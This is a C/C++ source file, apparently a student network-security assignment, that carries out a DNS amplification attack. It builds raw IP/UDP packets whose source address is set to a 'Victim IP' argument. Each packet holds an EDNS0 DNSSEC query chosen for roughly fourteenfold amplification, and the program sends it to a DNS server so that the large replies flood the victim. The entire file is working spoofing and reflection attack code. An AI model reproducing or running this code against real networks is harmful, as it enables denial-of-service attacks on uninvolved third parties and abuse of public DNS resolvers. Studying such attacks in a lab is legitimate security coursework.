/* 
Author: Kuan-Ju Chen
ID: 0711529
Date: 2021/03/17
Note: Need to be executed in root mode.
*/
#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include<memory.h>
#include<stdlib.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h> // sockaddr_ll
#include<arpa/inet.h>
#include<netinet/if_ether.h>
#include<iomanip>
#include<iostream>

// The packet length
#define PCKT_LEN 100

char buffer[PCKT_LEN]; // packet

char *destination_ip, *source_ip;
int source_port;

// hex(711529) == ADB69
// dig +bufsize=4096 +dnssec @8.8.8.8 ap2.
// Standard query 0xdb69 A ap2 OPT
// query length: 75, response: 1068 -> 14.24
unsigned char DNS[] = { 
	0xDB, 0x69 , // ID
	0x01 ,0x20 , // Flags
	0x00 ,0x01 , // Question
	0x00 ,0x00, // Answer RRs
	0x00 ,0x00 , // Authority RRs
	0x00 ,0x01 , // Additional RRs
	// Queries
	0x03 ,0x61 ,0x70 ,0x32 ,0x00 ,// ap2
	0x00 ,0x01 , // type: A
	0x00 ,0x01 , // Class: IN
	// Additional records
	0x00 , // <Root>
	0x00 ,0x29 , // Type: OPT(41)
	0xFF ,0xFF , // UDP payload
	0x00 , // Higher bits in extended RCODE
	0x00,  // EDNS0 version
	0x80 ,0x00 , // DNSSEC security RRs, 0x80 can handle 0x00 cannot handle
	0x00 ,0x00 ,0x00 
};

 /* Calculate check sum */
unsigned short csum(unsigned short *buf, int nwords){ 
	unsigned long sum;
	for (sum = 0; nwords > 0; nwords--){
		sum += *buf++;
	}
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	return (unsigned short)(~sum);
}

/* set the ip header */
struct iphdr* set_ip(){
	struct iphdr *ip = (struct iphdr *) buffer;
	
	/* Fabricate the IP header or we can use the standard header structures but assign our own values. */
	ip->ihl = 5; //minimum number of octets
	ip->version = 4;
	ip->tos = 0;
	ip->tot_len = ((sizeof(struct iphdr) + sizeof(struct udphdr)+sizeof(DNS)));
	ip->id = htons(4321); 
	ip->ttl = MAXTTL;
	ip->frag_off = 0;
	ip->protocol = 17; // UDP
	ip->check = 0;
	ip->saddr = inet_addr(source_ip); 
	ip->daddr = inet_addr(destination_ip);
	
	return ip;
}

struct udphdr* set_udp(){
	struct udphdr *udp = (struct udphdr *) (buffer + sizeof(struct iphdr));
	
	/* Fabricate the UDP header. Source port number, redundant */
	udp->source = htons(source_port);
	udp->dest = htons(53); // dns use port 53
	udp->len = htons(sizeof(struct udphdr)+sizeof(DNS));
	udp->check = 0; // udp checksum 0 means cuhecksum unused
	
	return udp;
}

 /* Source IP, source port, target IP, target port from the command line arguments */
int main(int argc, char *argv[]){
	int sd;
	
	if (argc != 4){
		fprintf(stderr, "usage: %s <Victim IP> <UDP Source Port> <DNS Server IP>\n", argv[0]);
		exit(-1);
	}
	
	source_ip = argv[1];
	source_port = atoi(argv[2]);
	destination_ip = argv[3];
	
	struct iphdr *ip;
	struct udphdr *udp;
	struct sockaddr_in sin, dist;	// Source and destination addresses: IP and port
	int  one = 1;
	const int *val = &one;
	memset(buffer, 0, PCKT_LEN);// cache reset 0

	 /* Create a raw socket with UDP protocol */
	if ( (sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP)) == -1 ){
		perror("socket() error");
		exit(-1);
	}
	else{
		printf("socket estiblish successd !\n");
	}
	
	// IPPROTO_TP: user fill in the IP content by thenselves
	// IP_HDRINCL: use kernel to calcuate the IP content's header checksum and pedding what IP's id
	if ( setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(int))  ){
		perror("setsockopt() error");
		exit(-1);
	} else{
		printf("setsockopt successed ! \n");
	}

	// The address family
	sin.sin_family = AF_INET;
	dist.sin_family = AF_INET;
	// Port numbers
	sin.sin_port = htons(source_port);
	dist.sin_port = htons(53);
	// IP addresses
	sin.sin_addr.s_addr = inet_addr(source_ip);
	dist.sin_addr.s_addr = inet_addr(destination_ip);

	ip = set_ip();
	udp = set_udp();
	
	 /* Send loop */
	// printf("Trying...\n");
	// printf("Using raw socket and UDP protocol\n");
	// printf("Using Source IP: %s port: %u, Target IP: %s.\n", source_ip, source_port, destination_ip);
	// std::cout << "Ip length:" << ip->tot_len << std::endl;
	int count;
	memcpy(buffer + sizeof(iphdr) + sizeof(udphdr), DNS, sizeof(DNS));
	
	for (count = 1; count <= 3; count++){
		if (sendto(sd, buffer, ip->tot_len, 0, (struct sockaddr *)&dist, sizeof(dist)) < 0){
			perror("sendto() error");
			exit(-1);
		}else{
			printf("Count #%u - sendto() is OK.\n", count);
			sleep(2);
		}
	}
	close(sd);
	return 0;
}